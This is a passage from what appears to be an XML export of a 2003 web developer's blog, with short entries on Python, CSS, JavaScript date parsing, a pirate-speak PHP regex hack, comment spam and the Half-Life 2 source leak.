 &lt;li&gt;&lt;a href=&quot;http://diveintopython.org/power_of_introspection/and_or.html&quot;&gt;2.6. The peculiar nature of and and or&lt;/a&gt; - almost a tertiary statement for Python.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://diveintopython.org/unit_testing/index.html&quot;&gt;Chapter 6. Unit Testing&lt;/a&gt; - the best explanation of unit testing I've ever read, with a great practical example of the technique in action.&lt;/li&gt;
&lt;/ul&gt;
</field>
		<field name="created">2003-09-17 10:51:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1191</field>
		<field name="title">Aaaaarr</field>
		<field name="slug">aaar</field>
		<field name="body">&lt;p&gt;It be &lt;a href=&quot;http://www.talklikeapirate.com/&quot;&gt;International Pirate Day&lt;/a&gt;, ya scurvy landlubbers. Avast and be merry, for the day is young and the wenches plentiful. And remember t'chat up line of the day: &lt;strong&gt;Prepare to be boarded!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;(&lt;a href=&quot;http://www.weebl.jolt.co.uk/&quot;&gt;Weebl and Bob's&lt;/a&gt; navigation be worth an eyeball an' all.)&lt;/p&gt;</field>
		<field name="created">2003-09-19 02:37:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1192</field>
		<field name="title">New virus?</field>
		<field name="slug">newVirus</field>
		<field name="body">&lt;p&gt;I don't usually get more than 5 or 6 spams a day, but today I've been hammered with an additional 7 emails with executable attachments claiming to be the &quot;latest critical patch&quot; from Microsoft. The emails are &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; formatted and make a pretty convincing rendition of a Microsoft.com page, so I can see how less savvy internet users could easily fall for them. Is this yet &lt;em&gt;another&lt;/em&gt; virus outbreak? I make that the third in as many weeks.&lt;/p&gt;</field>
		<field name="created">2003-09-19 19:35:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1193</field>
		<field name="title">The pirate's code</field>
		<field name="slug">pirateCode</field>
		<field name="body">&lt;p&gt;So, now that &quot;talk like a pirate&quot; day has sadly come to an end, it's time to reveal the five minute code hack that rendered my front page semi-legible for the best part of a day. It was actually pretty simple:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;function piratify($text) {
    return preg_replace_callback('/&amp;gt;(.*?)&amp;lt;/s', 'aaaar', $text);
}

function aaaar($text) {
    $text = $text[1];
    $a = array(
        '/\\bis\\b/' =&amp;gt; 'be',            # is =&amp;gt; be
        '/\\b([tT])he /' =&amp;gt; &quot;\\1'&quot;,      # the =&amp;gt; t'
        '/\\bam\\b/' =&amp;gt; 'be',            # am =&amp;gt; be
        '/(\\w)v(\\w)/' =&amp;gt; &quot;\\1'\\2&quot;,    # v =&amp;gt; ' (in words)
        '/ing\\b/' =&amp;gt; &quot;in'&quot;,             # ing =&amp;gt; in'
        '/(\\w)ar(\\w)/' =&amp;gt; &quot;\\1aar\\2&quot;, # ar =&amp;gt; aar (in words)
    );
    foreach($a as $re =&amp;gt; $new) {
        $text = preg_replace($re, $new, $text);
    }
    return '&amp;gt;'.$text.'&amp;lt;';
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My first attempt simply applied the 6 regular expressions shown above, but they mangled links within my entries as well. The solution was to use preg_replace_callback to target only text occuring outside of &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; tags (defined as anything between a &amp;gt; and a &amp;lt;). This turned a five minute hack in to half an hour of frenzied debugging as I'd already posted the change to my site! In fact, the whole lot was written at 2am in the morning with my friend &lt;a href=&quot;http://blog.pyrate.net/&quot;&gt;Tristan&lt;/a&gt; after a night out with &lt;a href=&quot;http://blog.mooncalf.me.uk/&quot;&gt;Andy&lt;/a&gt;. Some how cider makes for easier construction of regular expressions.&lt;/p&gt;

&lt;p&gt;I'm not the only person to have written a piratify function: &lt;a href=&quot;http://dougal.gunters.org/&quot;&gt;Dougal Campbell&lt;/a&gt; has one as well (also mentioned &lt;a href=&quot;http://blogs.linux.ie/xeer/archives/p/89490588/more/1/c/1&quot; title=&quot;Piratizing your blog&quot;&gt;here&lt;/a&gt;). I'm looking forward to seeing his released code.&lt;/p&gt;</field>
		<field name="created">2003-09-20 00:00:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1194</field>
		<field name="title">Auto-complete text boxes</field>
		<field name="slug">autoComplete</field>
		<field name="body">&lt;p&gt;There's a great new article up on Sitepoint describing a technique for &lt;a href=&quot;http://www.sitepoint.com/article/1220&quot; title=&quot;Make Life Easy With Autocomplete Textboxes&quot;&gt;adding auto-complete functionality&lt;/a&gt; to normal &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; text input fields using Javascript. The code uses a whole bunch of browser-specific code, but it has to thanks to the unconsistent ways in which different browsers handle text selection ranges. Unfortunately the article doesn't actually provide a demo of the code in action, so I've &lt;a href=&quot;http://simon.incutio.com/code/js/autocomplete/&quot; title=&quot;Autocomplete Textbox Example&quot;&gt;posted one here&lt;/a&gt;. It's a very nice effect.&lt;/p&gt;</field>
		<field name="created">2003-09-20 00:24:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1195</field>
		<field name="title">&quot;Interactive Tabular Data&quot;</field>
		<field name="slug">interactiveTabularData</field>
		<field name="body">&lt;p&gt;Just spotted in a comment by &lt;a href=&quot;http://www.allinthehead.com/&quot;&gt;Drew McLellan&lt;/a&gt; on &lt;a href=&quot;http://www.russellbeattie.com/notebook/1004315.html&quot; title=&quot;Formatting Forms in XHTML/CSS&quot;&gt;Russell Beattie's Notebook&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.russellbeattie.com/notebook/1004315.html#215221&quot;&gt;&lt;p&gt;I'm comfortable using tables for forms. My point of view is that they are interactive tabular data.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'd never thought of them like that before, but that view point certainly makes a lot of sense.&lt;/p&gt;

&lt;p&gt;I recently contributed my own opinion on trying to create &quot;semantic&quot; forms to an &lt;a href=&quot;http://www.simplebits.com/archives/2003/09/16/simplequiz_part_vi_formatting.html&quot; title=&quot;SimpleQuiz &amp;gt; Part VI &amp;gt; Form(atting)&quot;&gt;interesting discussion&lt;/a&gt; on SimpleBits:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.simplebits.com/archives/2003/09/16/simplequiz_part_vi_formatting.html#comment3&quot;&gt;&lt;p&gt;... When an HTML page incorporates forms it starts to move away from being a &quot;structural document&quot; and towards being a &quot;logical interface&quot; instead - once I start working with forms I switch my focus from semantics to accessibility and usability. Since these share many of the same requriements as semantics (use proper header tags etc) I don't feel too guilty about using divs instead of paragraphs.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-09-20 00:36:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1196</field>
		<field name="title">Battling comment spam</field>
		<field name="slug">moreCommentSpam</field>
		<field name="body">&lt;p&gt;It's a sad state of affairs when you come back to your blog after a week elsewhere and have to add another 56 domains to your &lt;a href=&quot;http://simon.incutio.com/blacklist.txt&quot;&gt;blacklist&lt;/a&gt;. I'm actually getting more comment spam than legitimate comments now - this is becoming more than just a minor nuisance. I'm considering a number of improvements, including adding a moderation queue to comments on entries posted more than a month ago, disabling the comment form if the referral is a search engine (as per &lt;a href=&quot;http://simon.incutio.com/archive/2003/08/28/googleComments&quot;&gt;Russell Beattie's suggestion&lt;/a&gt;) and adding some kind of wildcard support to the blacklist file.&lt;/p&gt;

&lt;p&gt;I'd really rather not do any of this, but the problem looks like it's going to escalate.&lt;/p&gt;</field>
		<field name="created">2003-09-30 13:34:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1197</field>
		<field name="title">Good Gifts</field>
		<field name="slug">goodGifts</field>
		<field name="body">&lt;p&gt;Some friends of the family have created a brilliant charitable solution to the problem of buying a gift for someone who already has everything. The &lt;a href=&quot;http://www.goodgifts.org/&quot;&gt;Good Gifts Catalogue&lt;/a&gt; sells products such as a &lt;a href=&quot;http://www.goodgifts.org/goodgifts/product_info.php?cPath=67&amp;amp;products_id=20&quot;&gt;New leash of life&lt;/a&gt; for homeless dogs, &lt;a href=&quot;http://www.goodgifts.org/goodgifts/product_info.php?cPath=67&amp;amp;products_id=44&quot;&gt;Ropes for monkeys&lt;/a&gt; living in zoos and many other cleverly titled charitable packages. The full price of every item ordered is donated to the supported charity and the recipient of the gift gets a keepsake card describing the gift given on their behalf. My favourite item from the catalogue has to be &lt;a href=&quot;http://www.goodgifts.org/goodgifts/product_info.php?cPath=3_10&amp;amp;products_id=55&quot; title=&quot;3051 - FEED A RAT (care for homeless pets)&quot;&gt;this one&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.goodgifts.org/goodgifts/product_info.php?cPath=3_10&amp;amp;products_id=55&quot;&gt;
&lt;h4&gt;Feed a rat&lt;/h4&gt;

&lt;p&gt;For reasons too numerous to list, homeless pet rats need care until they're found new homes. £15 takes care of 6 weeks feeding and even includes a health check. If, however, you're fed up with a particular 'human rat', this gift could give expression to your feelings...&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-10-01 10:13:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1198</field>
		<field name="title">A better definition of Metadata</field>
		<field name="slug">metadataDefinition</field>
		<field name="body">&lt;p&gt;Ned Batchelder: &lt;a href=&quot;http://www.nedbatchelder.com/text/metadata-is-nothing-new.html&quot;&gt;Metadata is nothing new&lt;/a&gt;. Ned includes a far better definition of metadata than the standard &quot;data about data&quot; phrase:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.nedbatchelder.com/text/metadata-is-nothing-new.html&quot;&gt;&lt;p&gt;
Metadata is information about a thing, apart from the thing itself.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Ned also offers clear examples of metadata in the real world and shows how the concept goes back thousands of years. If you still don't quite understand what the term means you won't have any excuses once you've read his article.&lt;/p&gt;
</field>
		<field name="created">2003-10-01 11:17:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1199</field>
		<field name="title">AdSense Backlash</field>
		<field name="slug">adsenseBacklash</field>
		<field name="body">&lt;p&gt;I guess it really was too good to be true. The AdSense backlash has begun, with Eric Thauvin's &lt;a href=&quot;http://www.thauvin.net/blog/news.jsp?date=2003-10-01#665&quot; title=&quot;Too good to be true...&quot;&gt;dismissal from the scheme&lt;/a&gt; for &quot;invalid clicks&quot; prompting Russell Beattie to &lt;a href=&quot;http://www.russellbeattie.com/notebook/1004557.html&quot; title=&quot;Is Google Playing Games?&quot;&gt;take a good look&lt;/a&gt; at the AdSense terms and conditions - which have some pretty nasty twists in them. The plot has thickened today with Google &lt;a href=&quot;http://www.russellbeattie.com/notebook/1004598.html&quot; title=&quot;Google Tightens The Screws&quot;&gt;adding a new term&lt;/a&gt; prohibiting users from issuing &lt;q cite=&quot;http://www.russellbeattie.com/notebook/1004598.html&quot;&gt;any press release or mak[ing] any public statement about the subject matter of this Agreement&lt;/q&gt;. What's &lt;strong&gt;that&lt;/strong&gt; about?&lt;/p&gt;

&lt;p&gt;Google are obviously trying to cover their backs against people who would abuse the system by clicking their own ads (manually or with a script), but seem to be using draconian measures to do so. This raises an interesting question: can a malicious third party deprive their competition of advertising revenue by setting up a script to follow their &lt;em&gt;competitor's&lt;/em&gt; Google ads, thus banning them from the service? I don't see how Google could detect such shenanigans, especially given the number of advertisers within their system.&lt;/p&gt;

&lt;p&gt;Let's just hope the Google mantra &quot;don't be evil&quot; wins out in the end. At the moment their AdSense programme is suddenly looking a lot less tempting.&lt;/p&gt;</field>
		<field name="created">2003-10-02 18:20:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1200</field>
		<field name="title">Alarm Bell Phrases</field>
		<field name="slug">alarmBells</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://c2.com/cgi/wiki?AlarmBellPhrases&quot;&gt;Alarm Bell Phrases&lt;/a&gt; on Ward's Wiki are just great. As with all links to the Wiki though, be warned: click too many links and hours of your life will inexplicably vanish...&lt;/p&gt;</field>
		<field name="created">2003-10-02 18:32:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1201</field>
		<field name="title">Designing for Colour Blindness</field>
		<field name="slug">colourBlindness</field>
		<field name="body">&lt;p&gt;Dave Shea is running a series on designing for colour blindness: parts &lt;a href=&quot;http://www.mezzoblue.com/archives/2003/09/29/colour_bland/&quot; title=&quot;Colour Bland: Value&quot;&gt;one&lt;/a&gt; and &lt;a href=&quot;http://www.mezzoblue.com/archives/2003/10/01/colour_bland/&quot; title=&quot;Colour Bland: Contrast&quot;&gt;two&lt;/a&gt; are already available. I've found the &lt;a href=&quot;http://colorfilter.wickline.org/&quot;&gt;Colorblind Web Page Filter&lt;/a&gt; useful in the past as a tool for understanding the problems faced by colour-blind users.&lt;/p&gt;
</field>
		<field name="created">2003-10-02 18:45:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1202</field>
		<field name="title">Balancing Act</field>
		<field name="slug">balancingAct</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.guuui.com/issues/04_03.asp&quot;&gt;Balancing visual and structural complexity in interaction design&lt;/a&gt; (via &lt;a href=&quot;http://www.steptwo.com.au/columntwo/archives/000902.html#000902&quot; title=&quot;Column Two: Balancing visual and structural complexity in interaction design&quot;&gt;Column Two&lt;/a&gt;) is an interesting article that shows how over-simplifying a design can harm usability rather than helping it.&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.guuui.com/issues/04_03.asp&quot;&gt;&lt;p&gt;
It's true that the more simple a page looks, the easier users can find information on it. But reducing visual complexity to make things pleasing to the eye by hiding critical information from users will inevitably increase structural complexity, and make it difficult for users to grasp and navigate the site.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;It also includes a good debunking of the idea that users don't like to scroll - in this age of wheel mouses I've never understood some people's preference for multi-page articles over one page with a scroll bar. The article concludes that the real challenge is coming up with the proper balance between visual and structural complexity.&lt;/p&gt;</field>
		<field name="created">2003-10-02 18:53:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1203</field>
		<field name="title">The Philosophy of Ruby</field>
		<field name="slug">philosophyOfRuby</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.artima.com/intv/ruby.html&quot;&gt;The Philosophy of Ruby&lt;/a&gt; is the first part of Artima's interview with Yukihiro Matsumoto (aka Matz), creator of the Ruby language. The interview touches on the philosophical differences between Python and Ruby, in particular Python's preference for having one obvious way of doing things:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.artima.com/intv/ruby3.html&quot;&gt;&lt;p&gt;
Ruby inherited the Perl philosophy of having more than one way to do the same thing. I inherited that philosophy from Larry Wall, who is my hero actually. I want to make Ruby users free. I want to give them the freedom to choose. People are different. People choose different criteria. But if there is a better way among many alternatives, I want to encourage that way by making it comfortable. So that's what I've tried to do. Maybe Python code is a bit more readable. Everyone can write the same style of Python code, so it can be easier to read, maybe. But the difference from one person to the next is so big, providing only one way is little help even if you're using Python, I think. I'd rather provide many ways if it's possible, but encourage or guide users to choose a better way if it's possible.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Ruby vs Python is currently threatening to overtake Perl vs Python as the favourite holy war amongst language geeks. I'm predisposed towards Python, mainly because I haven't seen any benefits of Ruby over Python strong enough to convince me to invest some serious time in the former.&lt;/p&gt;</field>
		<field name="created">2003-10-02 19:47:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1204</field>
		<field name="title">Outlook not so good</field>
		<field name="slug">outlookNotSoGood</field>
		<field name="body">&lt;p&gt;Yesterday, the Half-Life 2 source code &lt;a href=&quot;http://games.slashdot.org/games/03/10/02/1547218.shtml&quot; title=&quot;Half Life 2 Source Code Leaked&quot;&gt;was leaked&lt;/a&gt; (all 100 MB of it). Today comes the &lt;a href=&quot;http://www.halflife2.net/forums/showthread.php?threadid=10692&quot; title=&quot;I need the assistance of the community&quot;&gt;news from Valve&lt;/a&gt; that the leaked version is indeed the real thing, and that the leak was almost certainly the result of keystroke recorders installed remotely on Valve machines using a buffer overflow in Outlook's preview pane.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Ouch!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Valve are seeking the assistance of the community to help them track down the culprit, who may also be responsible for Denial of Service attacks against their network. I think this is the most serious targetted cracking attempt I've ever read about.&lt;/p&gt;

&lt;p&gt;As for the source itself being available, the biggest concern seems to be that it will allow cheaters to truly rip the new Half-Life engine to shreds. I used to play a lot of online games, and nothing ruins a game more than cheating.&lt;/p&gt;

&lt;p&gt;That said, the most interesting comment I read about the leak was &lt;a href=&quot;http://games.slashdot.org/comments.pl?cid=7116629&amp;amp;sid=80813&quot; title=&quot;Falcon 4.0&amp;apos;s Leaked Source Code&quot;&gt;this one on Slashdot&lt;/a&gt; describing how the leak of the source code for Falcon 4.0 lead to a huge community effort to dramatically improve the original game. Since Valve already have a great history of supporting the modding community I doubt that the effects of this leak will be nearly as beneficial.&lt;/p&gt;</field>
		<field name="created">2003-10-03 09:58:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1205</field>
		<field name="title">mod_python introduction</field>
		<field name="slug">modPythonIntro</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/python/2003/10/02/mod_python.html&quot;&gt;Introducing mod_python&lt;/a&gt; by Gregory Trubetskoy. One of my biggest problems with mod_python is that documentation outside of the &lt;a href=&quot;http://www.modpython.org/live/current/doc-html&quot;&gt;mod_python manual&lt;/a&gt; is pretty hard to come by. This article is more of an executive overview than a tutorial, but anything that adds to the overall body of knowledge out there concerning mod_python has to be a good thing. I'm hoping to write some material on mod_python best practises at some point in the near future, but I have to work out what they are first. Luckily the project has an active and very helpful &lt;a href=&quot;http://mailman.modpython.org/mailman/listinfo/mod_python&quot; title=&quot;mod_python user mailing list&quot;&gt;mailing list&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-10-03 10:22:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1206</field>
		<field name="title">Master of Fine Arts in Software</field>
		<field name="slug">mfaInSoftware</field>
		<field name="body">&lt;p&gt;Richard P. Gabriel's proposal for a &lt;a href=&quot;http://www.dreamsongs.com/MFASoftware.html&quot;&gt;Master of Fine Arts in Software&lt;/a&gt; looks like it's getting some &lt;a href=&quot;http://www.testing.com/cgi-bin/blog/2003/10/02#mfa&quot; title=&quot;Exploration Through Example: Master of Fine Arts in Software&quot;&gt;serious consideration&lt;/a&gt; from the University of Illinois (via &lt;a href=&quot;http://afongen.com/blog/archives/000563.php&quot; title=&quot;MFA in software might get somewhere&quot;&gt;Sam Buchanan&lt;/a&gt;). The idea of programming as a creative art has been around for a long time, so teaching it in this way is in some ways a logical progression. Personally I'm intrigued by the focus on reading other people's code - &quot;the work of masters&quot;. This is something that been sadly lacking in my BSc course at &lt;a href=&quot;http://www.bath.ac.uk/&quot;&gt;Bath&lt;/a&gt;. Aaron Swartz started a collection of links to &lt;a href=&quot;http://www.aaronsw.com/2002/qualitySoftware&quot;&gt;Quality Software&lt;/a&gt; last year, but other than that I don't know of any resources dedicated to highlighting &quot;classic&quot; code that deserves to be studied.&lt;/p&gt;</field>
		<field name="created">2003-10-03 23:50:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1207</field>
		<field name="title">Magazine styles in CSS</field>
		<field name="slug">magazineStyles</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://standardice.com/experimental/magazines.html&quot;&gt;Mimicking Magazines&lt;/a&gt; (via &lt;a href=&quot;http://techno-weenie.com/archives/2003/10/03/003238.php&quot; title=&quot;an orgy of links&quot;&gt;techno weenie&lt;/a&gt;) is a nice set of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; styled paragraphs inspired by the design of Cosmopolitan. They resize well thanks to intelligent use of ems for sizing instead of pixels.&lt;/p&gt;</field>
		<field name="created">2003-10-04 23:38:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1208</field>
		<field name="title">On CSS Remakes</field>
		<field name="slug">onCSSRemakes</field>
		<field name="body">&lt;p&gt;I'm a bit late to the party on this one, but Paul Hammond's &lt;a href=&quot;http://www.paranoidfish.org/notes/2003/09/25/2226&quot;&gt;open letter to &quot;tableless&quot; recoders&lt;/a&gt; caused quite a stir a few weeks back with its extensive list of reasons that recoding someone else's site in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; helps no one and can in fact have a negative affect on the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; advocacy effort (the response to the article is summarised in his &lt;a href=&quot;http://www.paranoidfish.org/notes/2003/09/28/1801&quot; title=&quot;More on &amp;quot;tableless&amp;quot; recoders&quot;&gt;follow up post&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;A year ago I would have strongly disagreed with him - the question then was whether or not &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; was even capable of creating complex layouts, and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; redesigns were a valuable demonstration of how much could be achieved without tables. I am unsure if that argument has been won yet - there still exist legions of web developers who think &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is a useful trick for turning off the underlines on links - but the body of evidence seems great enough now that this no longer counts as a valid reason for creating tableless remakes. Paul's main arguments rest on etiquette (it's rude to dismiss someone's work by recreating it), and it's hard to disagree with him there.&lt;/p&gt;

&lt;p&gt;That said, I remain a huge fan of tableless recoding as a tool for education. I myself have a collection of over a dozen recreations of existing sites in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, the majority of which I have never publicised and have no intention of doing so. While I was learning &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; (and I doubt you can truly ever finish learning it) I used to recode existing sites at a rate of one or two a week, targetting sites with designs that looked particularly well suited to tables. I learnt a great deal doing this, and I would recommend it to anyone still getting to grips with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; positioning.&lt;/p&gt;

&lt;p&gt;Paul is right that publishing &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; remakes of existing sites with no good reason is no longer appropriate, but as a tool for education this activity should not be under-estimated.&lt;/p&gt;</field>
		<field name="created">2003-10-04 23:56:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1209</field>
		<field name="title">Interesting jobs at the BBC</field>
		<field name="slug">interestingJobs</field>
		<field name="body">&lt;p&gt;Spotted on &lt;a href=&quot;http://www.cityofsound.com/blog/2003/09/were_hiring.html&quot; title=&quot;We&amp;apos;re hiring (23rd September&quot;&gt;City of Sound&lt;/a&gt;, via &lt;a href=&quot;http://www.paranoidfish.org/notes/2003/10/06/1707&quot; title=&quot;A Change of Scenery&quot;&gt;Paul Hammond&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.cityofsound.com/blog/2003/09/were_hiring.html&quot;&gt;
&lt;p&gt;Folks will know I don't usually do this kind of thing, but ...
we're hiring. I'm looking to add to our Technology and Design team at
BBC Radio and Music Interactive. We're responsible for designing and
building all the BBC's radio and music-based interactive services, from
our &lt;a href=&quot;http://www.bbc.co.uk/radio/&quot;&gt;radio&lt;/a&gt; and &lt;a href=&quot;http://www.bbc.co.uk/music/&quot;&gt;music&lt;/a&gt; web-based products, through to our new DTV channels and WAP services. I manage the team.&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;And now, we're looking for a couple of &lt;strong&gt;software engineers&lt;/strong&gt;,
initially on a 6-month contract - good solid programmers, based around
Perl, Python etc. Helping make public-facing apps like Challenge Lawro,
building internal workflow tools like &lt;a href=&quot;http://www.plasticbag.org/archives/2003/08/the_ugly_wiki_part_two.shtml&quot;&gt;the wiki Tom wrote about recently&lt;/a&gt;, doing R&amp;amp;D stuff around DAB Java, all kinds of things.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I'm not looking for a job, but if I was I'd jump at the chance.&lt;/p&gt;</field>
		<field name="created">2003-10-06 20:06:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1210</field>
		<field name="title">A better way of entering dates</field>
		<field name="slug">betterDateInput</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://c2.com/cgi/wiki?CreativityGoblin&quot;&gt;CreativityGoblin&lt;/a&gt; dropped in on me today, and as a result I've been tackling the challenge of entering dates in to a web application. In the past, I've used &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; calendar widgets for this purpose (my favourite is Mishoo's highly configurable, standards compliant &lt;a href=&quot;http://dynarch.com/mishoo/calendar.epl&quot;&gt;JS Calendar&lt;/a&gt;) but while widgets like this have a great deal of &quot;wow&quot; factor I'm not convinced that they are the best entry mechanism when it comes to raw user speed. Today's experiment was partially inspired by &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;a href=&quot;http://www.php.net/strtotime&quot;&gt;&lt;code&gt;strtotime&lt;/code&gt;&lt;/a&gt; function, which accepts a string in a wide variety of formats and converts it in to a time.&lt;/p&gt;

&lt;p&gt;I wanted the same thing but in Javascript, as interfaces like this are best carried out on the client without needing a round trip to the server to check any entered data. Here's &lt;a href=&quot;http://simon.incutio.com/code/js/date-parser/&quot; title=&quot;Better date input demo&quot;&gt;a demo&lt;/a&gt; of what I came up with (javascript code &lt;a href=&quot;http://simon.incutio.com/code/js/date-parser/dateparse.js&quot; title=&quot;dateparse.js&quot;&gt;here&lt;/a&gt;). It accepts a number of different input formats and converts them to a standardised mm/dd/yyyy (American style dates because it's for use in an American piece of software) when you move the focus away from the box. Importantly, the date is shown in two places: in the input box itself and in &quot;Mon Oct 06 2003&quot; format as text below the date entry field. This second display serves two purposes. Firstly, by displaying the date in an unambiguous format mistakes are easier to spot (especially important considering the American date format used in the main input). Secondly, it provides a useful place to display error messages should the script fail to parse some input.&lt;/p&gt;

&lt;p&gt;The Javascript itself was quite fun to write, and uses a number of interesting idioms I've picked up over the past year. It adds a 'filter' method to Javascript's Array class to better support functional programming (in fact I use it to match partially entered month and weekday names) and an 'indexOf' method identical to the one provided by the String class. The majority of the work is done by a data structure called dateParsePatterns, which defines a set of pairs of regular expressions and handler functions. The regular expressions match a n input style and extract any useful information; the handler functions then create a Date  object from the extracted information and return it to the caller.&lt;/p&gt;

&lt;p&gt;Finally, the code uses an error handling technique I picked up on Ward's Wiki called the &lt;a href=&quot;http://c2.com/cgi/wiki?SamuraiPrinciple&quot;&gt;SamuraiPrinciple&lt;/a&gt;, which states &lt;q cite=&quot;http://c2.com/cgi/wiki?SamuraiPrinciple&quot;&gt;you should either complete your contract and return a valid result, or throw an exception&lt;/q&gt;. This is used by the handlers and the main date parsing function itself, with thrown exceptions only caught by the magicDate function attached directly to the onblur event of the input box.&lt;/p&gt;

&lt;p&gt;There are still quite a few improvements that could be made to the code: more input styles (easily added by extending the main data structure), better planned functions and maybe a clean up to move more of the code out of the root Javascript namespace. For the moment though it serves my purpose just fine.&lt;/p&gt;

&lt;p&gt;&lt;strong title=&quot;6th October @ 23:12&quot;&gt;Update:&lt;/strong&gt; It wasn't the Creativity Goblin after all - it was the goblin of someone elses half remembered idea. It turns out my friend Andy &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/07/27#HotDate&quot; title=&quot;Hot date&quot;&gt;wrote something very similar to this&lt;/a&gt; back in July. Thinking back, I can remember seeing it as well. Despite not being original it's still a very useful piece of code.&lt;/p&gt;</field>
		<field name="created">2003-10-06 20:42:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1211</field>
		<field name="title">Infinite Python Data Structures</field>
		<field name="slug">infiniPy</field>
		<field name="body">&lt;p&gt;Hans Nowak has been churning out some really interesting Python stuff recently. He's been experimenting with &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_d7_2003_09_13.html#e343&quot; title=&quot;Return to innocence&quot;&gt;Self style objects in Python&lt;/a&gt; (similar in many respects to objects in Javascript), developing &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_Wax.html&quot; title=&quot;Tao of the Machine: Wax category&quot;&gt;Wax&lt;/a&gt;, a coder friendly wrapper around wxPython, working on a Python &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_d7_2003_10_04.html#e361&quot; title=&quot;1-day project: An adventure engine&quot;&gt;framework&lt;/a&gt; for writing text adventure games and most recently experimenting with &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_d7_2003_10_04.html#e362&quot; title=&quot;Swimming against the stream&quot;&gt;streams in Python&lt;/a&gt; using generators.&lt;/p&gt;

&lt;p&gt;Streams are a fascinating concept: they provide a way of defining infinite sized data structures, such as an array of all numbers that are multiples of 7. By only calculuating items when they are requested these seemingly impossible data structures can exist and be processed in a similar way to normal arrays. As Hans points out, Python generators aren't quite as elegant for this purpose as Scheme's stream implementation or Haskell's recurive list declarations but this use for them does help show why generators are such a powerful tool.&lt;/p&gt;</field>
		<field name="created">2003-10-06 21:23:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1212</field>
		<field name="title">Targetting CSS at IE5</field>
		<field name="slug">targetIE5</field>
